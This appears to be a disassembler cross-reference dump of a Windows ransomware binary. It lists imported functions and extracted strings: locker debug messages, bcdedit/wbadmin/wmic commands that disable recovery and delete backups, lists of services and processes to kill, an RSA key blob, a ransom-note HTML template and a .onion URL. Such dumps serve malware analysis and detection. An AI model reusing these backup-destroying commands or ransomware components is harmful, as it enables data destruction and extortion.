reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x405d26	0x47500c	import	0x405cd0	ADVAPI32.dll.RegSetValueExW
0x405d30	0x475010	import	0x405cd0	ADVAPI32.dll.RegCloseKey
0x405d4d	0x475008	import	0x405cd0	ADVAPI32.dll.RegOpenKeyExW
0x405d5c	0x4848fc	string	0x405cd0	EnableLinkedConnections
0x405d65	0x475054	import	0x405cd0	ADVAPI32.dll.RegDeleteValueW
0x405d6f	0x475010	import	0x405cd0	ADVAPI32.dll.RegCloseKey
0x405d7a	0x43a4e2	string	0x405cd0	;\rt J
0x405ee6	0x48492c	string	0x405d90	[LOCKER] Scan
0x405fb4	0x48494c	string	0x405d90	[LOCKER] Already Scan
0x405fe6	0x43a4e2	string	0x405d90	;\rt J
0x40618a	0x48497c	string	0x406130	[LOCKER] Is running\n
0x4061a1	0x4849a8	string	0x406130	{8761ABBD-7F85-42EE-B272-A76179687C63}
0x4061dc	0x4849f8	string	0x406130	[LOCKER] Is already running\n
0x406221	0x484a34	string	0x406130	[LOCKER] Priv: ADMIN\n
0x40622d	0x484a60	string	0x406130	[LOCKER] Priv: USER\n
0x406269	0x484a8c	string	0x406130	[LOCKER] Init cryptor\n
0x4062a3	0x484af8	string	0x406130	[LOCKER] Init cryptor is failed\n
0x4062e4	0x484abc	string	0x406130	[LOCKER] Put ID to HTML-code\n
0x4062fb	0x484b3c	string	0x406130	{{IDENTIFIER}}
0x40637f	0x484b88	string	0x406130	[LOCKER] Put ID to HTML-code is failed!\n
0x4063c0	0x484bdc	string	0x406130	[LOCKER] Put URL to HTML-code\n
0x4063d7	0x484b4c	string	0x406130	{{URL}}
0x40644b	0x484c58	string	0x406130	[LOCKER] Put URL to HTML-code is failed!\n
0x406494	0x484b54	string	0x406130	[LOCKER] Add to autorun\n
0x4064ab	0x484cac	string	0x406130	svhost
0x4064e0	0x484c1c	string	0x406130	[LOCKER] Scan hidden devices\n
0x406507	0x484cf0	string	0x406130	[LOCKER] Stop and delete services\n
0x4065d2	0x484cbc	string	0x406130	[LOCKER] Kill processes\n
0x4066b4	0x484d38	string	0x406130	[LOCKER] Remove backups
0x406703	0x484dc0	string	0x406130	bcdedit.exe /set {default} recoveryenabled No
0x40672d	0x484e48	string	0x406130	bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
0x406781	0x484f30	string	0x406130	wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
0x4067ab	0x484f90	string	0x406130	wmic.exe SHADOWCOPY /nointeractive
0x406820	0x484fd8	string	0x406130	[LOCKER] Run scanning...\n\n
0x4068b9	0x484e1c	string	0x406130	[LOCKER] Lock drive
0x4069ed	0x485010	string	0x406130	[LOCKER] Sleep at 60 seconds...\n\n
0x406a09	0x475154	import	0x406130	KERNEL32.dll.Sleep
0x406a81	0x43a4e2	string	0x406130	;\rt J
0x407030	0x43a4e2	string	0x406f10	;\rt J
0x4070d0	0x43a4e2	string	0x407040	;\rt J
0x407604	0x43a4e2	string	0x407430	;\rt J
0x407780	0x43a4e2	string	0x407710	;\rt J
0x408bac	0x43a4e2	string	0x408b10	;\rt J
0x408c48	0x43a4e2	string	0x408bc0	;\rt J
0x408ddf	0x43a4e2	string	0x408d30	;\rt J
0x409a07	0x43a4e2	string	0x409900	;\rt J
0x409ccb	0x43a4e2	string	0x409c60	;\rt J
0x40a017	0x43a4e2	string	0x409f10	;\rt J
0x40a493	0x497590	string	0x40a490	vector<T> too long
0x40a6bb	0x43a4e2	string	0x40a650	;\rt J
0x40a8a3	0x4975a4	string	0x40a8a0	invalid string position
0x40a8fe	0x455031	string	0x40a8e0	j\fh(
0x40aa5c	0x43a4e2	string	0x40a980	;\rt J
0x40aaa0	0x43a4e2	string	0x40aa70	;\rt J
0x40ac4f	0x43a4e2	string	0x40ab60	;\rt J
0x40ae1e	0x455031	string	0x40ae00	j\fh(
0x40b00b	0x43a4e2	string	0x40af20	;\rt J
0x40b5d1	0x43a4e2	string	0x40b4b0	;\rt J
0x40b752	0x43a4e2	string	0x40b660	;\rt J
0x40b8b0	0x43a4e2	string	0x40b7c0	;\rt J
0x40b9af	0x43a4e2	string	0x40b8c0	;\rt J
0x40baff	0x43a4e2	string	0x40b9c0	;\rt J
0x40bc2f	0x43a4e2	string	0x40bb40	;\rt J
0x40bd7d	0x43a4e2	string	0x40bc40	;\rt J
0x40bedc	0x43a4e2	string	0x40be90	;\rt J
0x40c5f3	0x4975bc	string	0x40c5f0	string too long
0x40c67e	0x43a4e2	string	0x40c600	;\rt J
0x40c78e	0x43a4e2	string	0x40c710	;\rt J
0x40cd07	0x43a4e2	string	0x40cc20	;\rt J
0x40d15a	0x43a4e2	string	0x40d0c0	;\rt J
0x40d4df	0x43a4e2	string	0x40d440	;\rt J
0x40e13b	0x43a4e2	string	0x40e0d0	;\rt J
0x40e5a0	0x43a4e2	string	0x40e500	;\rt J
0x40eb48	0x43a4e2	string	0x40ea60	;\rt J
0x40ed07	0x43a4e2	string	0x40ec30	;\rt J
0x40f4d9	0x46fdd0	string	0x40f470	WVS3
0x40f506	0x46fdd0	string	0x40f470	WVS3
0x4103b8	0x43a4e2	string	0x410320	;\rt J
0x410638	0x43a4e2	string	0x4105b0	;\rt J
0x41066c	0x455031	string	0x410650	j\fh(
0x411239	0x4846d4	string	0x4111a0	bad locale name
0x411369	0x43a4e2	string	0x411310	;\rt J
0x411724	0x43a4e2	string	0x411690	;\rt J
0x41186b	0x43a4e2	string	0x411780	;\rt J
0x4119f8	0x43a4e2	string	0x411880	;\rt J
0x411ad9	0x43a4e2	string	0x411a10	;\rt J
0x411b9e	0x43a4e2	string	0x411af0	;\rt J
0x411c5b	0x485058	string	0x411c30	BgIAAACkAABSU0ExAAgAAAEAAQCV9LvY1+a2rVQQKmHIYxXwltivcgEVoGHGSlKiHlpscysu4TFFZjGnMZGNZWTRb7nMG3dbHsF+AtpEqANZtrFEa7qB93oCcKf2tekVmX8LvN3iaucvPjMyGmt9pVa/t7B4lrASmVHYi0srzzdQ8TkIc26mzHrr++ZWx3RMQbz+6Elsifb2Z1fwTdpnQUJ4Otq5pxlzifT2tsB8jMTJv59N7owqCYivCq9bToZrfUdmnX+2shzyaAe6axPaVArV/j2/iRk83i2piMda86GD87AryP5fTYApA2cCP2hicRWHNCFBJW5hne5doonZ9y2gn509GMxYv9qAhB2x8a9i8p6X
0x411c68	0x484f0c	string	0x411c30	.lockfiles
0x411c90	0x4851d0	string	0x411c30	.exe,.dll,.sys,.ini,.lnk,.rdp,.encrypted,.READINSTRUCTIONS,.recoverme,.Readinstructions,.hivteam,.hiv,.386,.adv,.ani,.bat,.bin,.cab,.cmd,.com,.cpl,.cur,.deskthemepack,.diagcab,.diagcfg,.diagpkg,.dll,.drv,.exe,.hlp,.icl,.icns,.ico,.ics,.idx,.ldf,.lnk,.log,.mod,.mpa,.msc,.msp,.msstyles,.msu,.nls,.nomedia,.ocx,.prf,.ps1,.rom,.rtp,.scr,.shs,.spl,.sys,.theme,.themepack,.wpx,.lock,.key,.hta,.msi,.enc,.deadfiles,.lockernetwork,.monster,.NETFULL,.shanghai,.support,.DE,.netlock,.BR,.LOCK,.shanghai2,.monster,.MY,.GR,.ID,.MA,.HU,.IN,.BG,.titan,.cryptocrypto,.dodik,.shanghai3,.TW,.shanghai4,.AU,.lockes,.DEDE,.RS,.local,.shanghai5,.shanghai6,.shanghai7,.locklock,.AULOCK,.FRFR,.lockers,.PedroChicken,.DogUlitos,.datalock,.stopfiles,.viets,.ILLOCK,.GBLOCK,.lokes,.KRLOCK,.AU,.KRLOCK2,.KRLOCK3,.KRLOCK4,.shanghai8,.sglock,.shanghai9,.shan,.EG,.networkmaze,.grgr,.lockhk,.netlockcn,.netlockcn2,.netlockuss,.netlockkiosktw,.netlockcncn,.netlockthth,.HKLOCK,.HKLOCKII,.netlockau,.netlocklk,.uslock,.hklockfiles,.lockeu,.netFRlock,.netMXlock,.netATlock,.netUSlock,.netHKlock,.netCAlock,.netUSlock,.netLAlock,.netIDlock,.netAUlock,.netCAlockII,.uslockh,.uslockII,.uslockIII,.uslockIV,.netca,.krnet,.hknet,.uslockhh,.grlock,.zalock,.itlock,.czlock,.frlock,.ittlock,.hklockII,.ITLOCK,.eslock,.ielock,.vnlock,.mdlock,.lvlock,.cnlock,.DELOCK,.DELOCKII,.delocks,.cnlockcorp,.itdatalock,.calockcomp,.lockus,.lockusus,.lockusss,.lockca,.lockussss,.nlock,.usdatalock,.pyton,.chlock,.eslock,.BELLOCKPYTON,.cnlock,.hippocrates,.locklock,.ZALOCK,.JPLOCK,.lockus,.DELOCK,.Readinstructions,.datalock1,.lockfiles1,.allock01,.LOCK,.LOCKNET,.LOCKNET2,.LOCKNET3,.LOCKNET4,.LOCKNET5,.skynet,.allock02,.skynet,.onelock,.skynet2,.skynet3,.skynet4,.skynet5,.allock2,.lockfiles,
0x411cba	0x4859f8	string	0x411c30	.csv,.sql,.mdf,.NDF,.SQLITEDB,.DDL,.SQLITE,.SQLITE3,.LDF,.EDB,.FDB,.FBK,.DBF
0x411ce4	0x486200	string	0x411c30	wrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.QuickBooks.FCS,QBCFMonitorService,sqlwriter,msmdsrv,tomcat6,zhudongfangyu,SQLADHLP,vmware-usbarbitator64,vmware-converter,dbsrv12,dbeng8
0x411d0e	0x486a58	string	0x411c30	wxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exe
0x411d5a	0x487290	string	0x411c30	How_to_back_files.html
0x411e58	0x411ea3	string	0x411e20	hTPH
0x411ec3	0x43a4e2	string	0x411e20	;\rt J
0x411f38	0x43a4e2	string	0x411ed0	;\rt J
0x411f7f	0x41200d	string	0x411f50	hJIH
0x41202d	0x43a4e2	string	0x411f50	;\rt J
0x41215f	0x43a4e2	string	0x412040	;\rt J
0x41229b	0x487310	string	0x412260	<html>\n <style type="text/css">\n\n body {\n background-color: #f5f5f5;\n }\n\nh1, h3{\n text-align: center;\n text-transform: uppercase;\n font-weight: normal;\n}\n\n\n/*---*/\n.tabs1{\n display: block;\n margin: auto;\n}\n.tabs1 .head{\n text-align: center;\n float: top;\n padding: 0px;\n text-transform: uppercase;\n font-weight: normal;\n display: block;\n background: #81bef7;\n color: #DF0101;\n font-size: 30px;\n}\n\n.tabs1 .identi {\n font-size: 10px;\n text-align: center;\n float: top;\n padding: 15px;\n display: block;\n background: #81bef7;\n color: #DFDFDF;\n}\n\n\n.tabs .content {\n background: #f5f5f5;\n /*text-align: center;*/\n color: #000000;\n padding: 25px 15px;\n font-size: 15px;\n font-weight: 400;\n line-height: 20px; }\n .tabs .content a {\n color: #df0130;\n font-size: 23px;\n font-style: italic;\n text-decoration: none;\n line-height: 35px; }\n\n\n.tabs .content .text{\npadding: 25px;\nline-height: 1.2;\n}\n\n\n </style>\n\n\n <body>\n\n <div class="tabs1">\n <div class="head" ><b>Your personal ID:</b></div>\n <div class="identi">\n <span style="width:1000px; color: #ffffff; font-size: 10px;">{{IDENTIFIER}}</span> <br>\n<!-- !!! dont changing this !!! -->\n </div>\n </div>\n <!-- -->\n <div class="tabs">\n<!--tab--> \n <div class="tab">\n <div id="tab-content1" class="content">\n \n <div class="text">\n <!--text data -->\n\n <b>/!\ YOUR COMPANY NETWORK HAS BEEN PENETRATED /!\</b><br>\n\n <b>All your important files have been encrypted!</b><br><br>\n\t <hr>\n Your files are safe! Only modified. (RSA+AES)<br><br>\n\nANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>\nWILL PERMANENTLY CORRUPT IT.<br>\nDO NOT MODIFY ENCRYPTED FILES.<br>\nDO NOT RENAME ENCRYPTED FILES.<br><br>\n\nNo software available on internet can help you. We are the only ones able to<br>
0x412359	0x43a4e2	string	0x412260	;\rt J
0x412450	0x496df4	string	0x412370	<br>
0x4124ae	0x43a4e2	string	0x412370	;\rt J
0x41259b	0x43a4e2	string	0x4124c0	;\rt J
0x41267e	0x496dfc	string	0x4125b0	<br>
0x4126dc	0x43a4e2	string	0x4125b0	;\rt J
0x412744	0x4859d4	string	0x4126f0	Ou6Lexab8jffZWVlLWqoNJwExq9kefkK
0x412772	0x496e20	string	0x4126f0	http://gvlay6u4g53rxdi5.onion/
0x41285d	0x43a4e2	string	0x4126f0	;\rt J
0x412bbc	0x412bc3	string	0x412b10	닋E؋M blocks=Hangul Syllables,Basic Latin,Arabic
0x412bd8	0x43a4e2	string	0x412b10	;\rt J
0x414091	0x497840	string	0x413f00	bad conversion
0x41411c	0x497840	string	0x413f00	bad conversion
0x41417f	0x43a4e2	string	0x413f00	;\rt J
0x4143c4	0x497840	string	0x414230	bad conversion
0x414453	0x497840	string	0x414230	bad conversion
0x4144b6	0x43a4e2	string	0x414230	;\rt J
0x414bab	0x43a4e2	string	0x414b10	;\rt J
0x414ff7	0x43a4e2	string	0x414ec0	;\rt J
0x4151dd	0x43a4e2	string	0x4150b0	;\rt J
0x415327	0x43a4e2	string	0x4151f0	;\rt J
0x415485	0x43a4e2	string	0x415340	;\rt J
0x41564d	0x43a4e2	string	0x415500	;\rt J
0x41579f	0x43a4e2	string	0x415660	;\rt J
0x4158ed	0x43a4e2	string	0x4157b0	;\rt J
0x415d8f	0x43a4e2	string	0x415cf0	;\rt J
0x415ef0	0x43a4e2	string	0x415e50	;\rt J
0x416109	0x475044	import	0x4160d0	ADVAPI32.dll.CryptDestroyKey
0x41612b	0x475014	import	0x4160d0	ADVAPI32.dll.CryptReleaseContext
0x41614d	0x475014	import	0x4160d0	ADVAPI32.dll.CryptReleaseContext
0x41623e	0x475050	import	0x4161c0	ADVAPI32.dll.CryptDuplicateKey
0x416255	0x4750e4	import	0x4161c0	KERNEL32.dll.GetFileAttributesW
0x416268	0x4750e0	import	0x4161c0	KERNEL32.dll.SetFileAttributesW
0x416289	0x4750e8	import	0x4161c0	KERNEL32.dll.CreateFileW
0x4162a0	0x486a04	string	0x4161c0	Encrypt file:
0x4162e1	0x4750d8	import	0x4161c0	KERNEL32.dll.CloseHandle
0x416316	0x4750cc	import	0x4161c0	KERNEL32.dll.MoveFileExW
0x41633e	0x4750d8	import	0x4161c0	KERNEL32.dll.CloseHandle
0x416348	0x475044	import	0x4161c0	ADVAPI32.dll.CryptDestroyKey
0x416361	0x43a4e2	string	0x4161c0	;\rt J
0x4163f7	0x475138	import	0x416370	KERNEL32.dll.GetFileSizeEx
0x4164b6	0x4750d0	import	0x416370	KERNEL32.dll.SetFilePointerEx
0x4164f6	0x47514c	import	0x416370	KERNEL32.dll.ReadFile
0x41652e	0x4750d0	import	0x416370	KERNEL32.dll.SetFilePointerEx
0x41660e	0x4750ec	import	0x416370	KERNEL32.dll.WriteFile
0x4166a0	0x4750d0	import	0x416370	KERNEL32.dll.SetFilePointerEx
0x4166d6	0x4750ec	import	0x416370	KERNEL32.dll.WriteFile
0x416778	0x4750ec	import	0x416370	KERNEL32.dll.WriteFile
0x4167c8	0x43a4e2	string	0x416370	;\rt J
0x41680b	0x475048	import	0x4167e0	ADVAPI32.dll.CryptAcquireContextW
0x416815	0x4750dc	import	0x4167e0	KERNEL32.dll.GetLastError
0x416826	0x496f30	string	0x4167e0	Microsoft Enhanced Cryptographic Provider v1.0
0x416834	0x475048	import	0x4167e0	ADVAPI32.dll.CryptAcquireContextW
0x416885	0x475048	import	0x416860	ADVAPI32.dll.CryptAcquireContextW
0x41688f	0x4750dc	import	0x416860	KERNEL32.dll.GetLastError
0x4168ab	0x475048	import	0x416860	ADVAPI32.dll.CryptAcquireContextW
0x41691c	0x47505c	import	0x4168d0	CRYPT32.dll.CryptStringToBinaryA
0x41692c	0x4750c8	import	0x4168d0	KERNEL32.dll.GetProcessHeap
0x416933	0x4750d4	import	0x4168d0	KERNEL32.dll.HeapAlloc
0x41695b	0x47505c	import	0x4168d0	CRYPT32.dll.CryptStringToBinaryA
0x41697f	0x47501c	import	0x4168d0	ADVAPI32.dll.CryptImportKey
0x416993	0x4750c8	import	0x4168d0	KERNEL32.dll.GetProcessHeap
0x41699a	0x475134	import	0x4168d0	KERNEL32.dll.HeapFree
0x4169a8	0x43a4e2	string	0x4168d0	;\rt J
0x416ba0	0x43a4e2	string	0x4169c0	;\rt J
0x416bcb	0x475018	import	0x416bb0	ADVAPI32.dll.CryptGenKey
0x416c01	0x475044	import	0x416bf0	ADVAPI32.dll.CryptDestroyKey
0x416c3e	0x47504c	import	0x416c10	ADVAPI32.dll.CryptEncrypt
0x416c57	0x43a4e2	string	0x416c10	;\rt J
0x416c9a	0x475000	import	0x416c70	ADVAPI32.dll.CryptExportKey
0x416cb3	0x43a4e2	string	0x416c70	;\rt J
0x416d08	0x47504c	import	0x416cc0	ADVAPI32.dll.CryptEncrypt
0x416d71	0x475000	import	0x416d30	ADVAPI32.dll.CryptExportKey
0x4170e9	0x43a4e2	string	0x417030	;\rt J
0x4171ac	0x43a4e2	string	0x417100	;\rt J
0x41726c	0x43a4e2	string	0x4171c0	;\rt J
0x417370	0x43a4e2	string	0x417280	;\rt J
0x4176ad	0x43a4e2	string	0x417580	;\rt J
0x417702	0x4750c4	import	0x4176c0	KERNEL32.dll.GetLogicalDrives
0x4177fe	0x43a4e2	string	0x4176c0	;\rt J
0x41788f	0x4752a0	import	0x417810	MPR.dll.WNetGetConnectionW
0x41792f	0x43a4e2	string	0x417810	;\rt J
0x417a70	0x43a4e2	string	0x417a30	;\rt J
0x417c54	0x43a4e2	string	0x417b90	;\rt J
0x417df6	0x486a24	string	0x417db0	ALLUSERSPROFILE
0x417e32	0x4872d4	string	0x417db0	PUBLIC
0x417eaa	0x4872e4	string	0x417db0	USERPROFILE
0x417eb7	0x486a44	string	0x417db0	\AppData
0x417f06	0x48b194	string	0x417db0	ProgramData
0x417f4b	0x48f054	string	0x417db0	WINDIR
0x417f90	0x48726c	string	0x417db0	PROGRAMFILES(x86)
0x417fd5	0x48f064	string	0x417db0	SYSTEMDRIVE
0x417fe5	0x492f24	string	0x417db0	\Program Files
0x41803a	0x492f44	string	0x417db0	SYSTEMDRIVE
0x41804a	0x4872fc	string	0x417db0	\AppData
0x41809f	0x496e04	string	0x417db0	SYSTEMDRIVE
0x4180af	0x48b1ac	string	0x417db0	\Application Data
0x418104	0x496eb4	string	0x417db0	SYSTEMDRIVE
0x418114	0x496ea4	string	0x417db0	\intel
0x418169	0x496fa0	string	0x417db0	SYSTEMDRIVE
0x418179	0x496f90	string	0x417db0	\nvidia
0x4181ce	0x496fb8	string	0x417db0	SYSTEMDRIVE
0x4181de	0x48f07c	string	0x417db0	\Users\All Users
0x418233	0x496fd0	string	0x417db0	SYSTEMDRIVE
0x418243	0x492f5c	string	0x417db0	\Windows
0x418298	0x49703c	string	0x417db0	SYSTEMDRIVE
0x4182a8	0x496fe8	string	0x417db0	\Program Files\Microsoft\Exchange Server
0x418300	0x4970b8	string	0x417db0	SYSTEMDRIVE
0x418310	0x497058	string	0x417db0	\Program Files (x86)\Microsoft\Exchange Server
0x418368	0x497118	string	0x417db0	SYSTEMDRIVE
0x418378	0x4970d0	string	0x417db0	\Program Files\Microsoft SQL Server
0x4183d0	0x497184	string	0x417db0	SYSTEMDRIVE
0x4183e0	0x497130	string	0x417db0	\Program Files (x86)\Microsoft SQL Server
0x418478	0x43a4e2	string	0x417db0	;\rt J
0x418552	0x43a4e2	string	0x418490	;\rt J
0x418768	0x43a4e2	string	0x418580	;\rt J
0x4187e6	0x4750c0	import	0x418780	KERNEL32.dll.GetEnvironmentVariableW
0x41883f	0x43a4e2	string	0x418780	;\rt J
0x418885	0x4188d0	string	0x418850	hTpI
0x41889d	0x4188d0	string	0x418850	hTpI
0x418a2d	0x43a4e2	string	0x418900	;\rt J
0x418e37	0x4978c8	string	0x418e30	system
0x418eb4	0x4978d0	string	0x418e40	unknown error
0x418f10	0x43a4e2	string	0x418e40	;\rt J
0x419148	0x43a4e2	string	0x4190b0	;\rt J
0x4191e2	0x43a4e2	string	0x419160	;\rt J
0x4192ad	0x43a4e2	string	0x419270	;\rt J
0x4193bd	0x43a4e2	string	0x419380	;\rt J
0x41983f	0x43a4e2	string	0x419610	;\rt J
0x4199ac	0x43a4e2	string	0x419880	;\rt J
0x419c9e	0x43a4e2	string	0x419c60	;\rt J
0x419d05	0x43a4e2	string	0x419cb0	;\rt J
0x419d95	0x43a4e2	string	0x419d40	;\rt J
0x419fbd	0x43a4e2	string	0x419de0	;\rt J
0x41a3b3	0x43a4e2	string	0x41a270	;\rt J
0x41a9ec	0x43a4e2	string	0x41a940	;\rt J
0x41aa9d	0x43a4e2	string	0x41aa60	;\rt J
0x41ac5e	0x43a4e2	string	0x41ab90	;\rt J
0x41affe	0x455031	string	0x41afe0	j\fh(
0x41b164	0x43a4e2	string	0x41b010	;\rt J
0x41b208	0x43a4e2	string	0x41b170	;\rt J
0x41b2f6	0x43a4e2	string	0x41b220	;\rt J
0x41b603	0x43a4e2	string	0x41b540	;\rt J
0x41b71f	0x43a4e2	string	0x41b6a0	;\rt J
0x41b916	0x4978e0	string	0x41b8f0	list<T> too long
0x41bba0	0x43a4e2	string	0x41bb60	;\rt J
0x41bf21	0x43a4e2	string	0x41bde0	;\rt J
0x41c95d	0x43a4e2	string	0x41c810	;\rt J
0x41ca82	0x4971b4	string	0x41c970	letter
0x41ca8b	0x49719c	string	0x41c970	[LOCKER] Assign device
0x41cb34	0x43a4e2	string	0x41c970	;\rt J
0x41cc6d	0x4750b8	import	0x41cbf0	KERNEL32.dll.FindFirstVolumeW
0x41cdb3	0x4750bc	import	0x41cbf0	KERNEL32.dll.QueryDosDeviceW
0x41ce77	0x4750a8	import	0x41cbf0	KERNEL32.dll.FindNextVolumeW
0x41ce8c	0x4750b0	import	0x41cbf0	KERNEL32.dll.FindVolumeClose
0x41cec8	0x43a4e2	string	0x41cbf0	;\rt J
0x41cf37	0x4750ac	import	0x41cee0	KERNEL32.dll.GetVolumePathNamesForVolumeNameW
0x41cfa0	0x43a4e2	string	0x41cee0	;\rt J
0x41d119	0x4750c4	import	0x41d0d0	KERNEL32.dll.GetLogicalDrives
0x41d1fe	0x43a4e2	string	0x41d0d0	;\rt J
0x41d28f	0x4752a0	import	0x41d210	MPR.dll.WNetGetConnectionW
0x41d2dc	0x43a4e2	string	0x41d210	;\rt J
0x41d329	0x4750b4	import	0x41d2f0	KERNEL32.dll.SetVolumeMountPointW
0x41db6f	0x43a4e2	string	0x41dad0	;\rt J
0x41dca0	0x43a4e2	string	0x41dc00	;\rt J
0x41de3b	0x4750e8	import	0x41dd90	KERNEL32.dll.CreateFileW
0x41de7f	0x4750ec	import	0x41dd90	KERNEL32.dll.WriteFile
0x41de89	0x4750d8	import	0x41dd90	KERNEL32.dll.CloseHandle
0x41debf	0x43a4e2	string	0x41dd90	;\rt J
0x41dfc6	0x4971d8	string	0x41dfa0	0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
0x41dfda	0x497218	string	0x41dfa0	0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
0x41e131	0x43a4e2	string	0x41e080	;\rt J
0x41e22b	0x497298	string	0x41e170	.$\\
0x41e402	0x43a4e2	string	0x41e170	;\rt J
0x41e58c	0x47506c	import	0x41e500	IPHLPAPI.DLL.GetAdaptersInfo
0x41e5e5	0x47506c	import	0x41e500	IPHLPAPI.DLL.GetAdaptersInfo
0x41e6a0	0x43a4e2	string	0x41e500	;\rt J
0x41e718	0x43a4e2	string	0x41e6b0	;\rt J
0x41e790	0x4752f0	import	0x41e730	WS2_32.dll.inet_addr
0x41e7a3	0x475070	import	0x41e730	IPHLPAPI.DLL.IcmpCreateFile
0x41e7f7	0x475064	import	0x41e730	IPHLPAPI.DLL.IcmpSendEcho
0x41e804	0x475068	import	0x41e730	IPHLPAPI.DLL.IcmpCloseHandle
0x41e843	0x475068	import	0x41e730	IPHLPAPI.DLL.IcmpCloseHandle
0x41e858	0x43a4e2	string	0x41e730	;\rt J
0x41e8f2	0x43a4e2	string	0x41e870	;\rt J
0x41e993	0x4752ac	import	0x41e900	NETAPI32.dll.NetShareEnum
0x41ea98	0x4752a8	import	0x41e900	NETAPI32.dll.NetApiBufferFree
0x41eadb	0x43a4e2	string	0x41e900	;\rt J
0x41ec20	0x43a4e2	string	0x41eb80	;\rt J
0x41f345	0x43a4e2	string	0x41f200	;\rt J
0x41f3b5	0x4752d8	import	0x41f350	RstrtMgr.DLL.RmStartSession
0x41f3e0	0x4752d4	import	0x41f350	RstrtMgr.DLL.RmRegisterResources
0x41f42c	0x4752dc	import	0x41f350	RstrtMgr.DLL.RmGetList
